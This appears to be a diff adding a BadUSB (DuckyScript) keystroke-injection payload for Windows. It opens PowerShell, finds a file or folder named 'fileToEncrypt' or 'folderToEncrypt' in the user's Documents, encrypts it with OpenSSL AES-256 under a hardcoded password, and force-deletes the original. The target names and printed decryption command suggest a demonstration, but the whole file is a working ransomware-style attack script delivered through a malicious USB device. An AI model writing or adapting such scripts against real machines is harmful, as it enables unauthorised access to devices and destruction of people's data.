@@ -1,0 +1,51 @@
+REM BadUSB Script for Windows - Encrypt fileToEncrypt or folderToEncrypt from Documents
+
+DELAY 1000
+REM Open PowerShell
+GUI r
+DELAY 500
+STRING powershell.exe
+ENTER
+DELAY 1500
+
+REM Navigate to the Documents folder
+STRING cd $env:USERPROFILE\Documents
+ENTER
+DELAY 500
+
+REM Check for fileToEncrypt or folderToEncrypt
+STRING if (Test-Path "fileToEncrypt") { $File = "fileToEncrypt" } elseif (Test-Path "folderToEncrypt") { $File = "folderToEncrypt" } else { Write-Host "Nothing to encrypt"; exit }
+ENTER
+DELAY 500
+
+REM Determine file extension (if a file exists) or set extension to zip if folder
+STRING if (Test-Path $File -PathType Leaf) { $ext = ($File -split "\.")[-1] } else { $ext = "zip" }
+ENTER
+DELAY 500
+
+REM If target is a folder, compress it into a ZIP archive and update $File variable
+STRING if (Test-Path $File -PathType Container) { Compress-Archive -Path $File -DestinationPath "$File.zip"; $File = "$File.zip" }
+ENTER
+DELAY 500
+
+REM Encrypt the file using OpenSSL (assumes OpenSSL is installed)
+STRING openssl enc -aes-256-cbc -salt -in $File -out "$env:USERPROFILE\Desktop\ENCRYPTED.enc" -pass pass:S3cur3P@ssw0rd!
+ENTER
+DELAY 500
+
+REM Remove the original file or archive
+STRING Remove-Item $File -Force
+ENTER
+DELAY 500
+
+REM Print decryption instructions
+STRING Write-Host "Encryption complete. To decrypt, run:"
+ENTER
+DELAY 250
+STRING Write-Host "openssl enc -aes-256-cbc -d -in $env:USERPROFILE\Desktop\ENCRYPTED.enc -out $env:USERPROFILE\Desktop\yourfile.$ext -pass pass:S3cur3P@ssw0rd!"
+ENTER
+DELAY 1000
+
+REM Close PowerShell window
+STRING exit
+ENTER
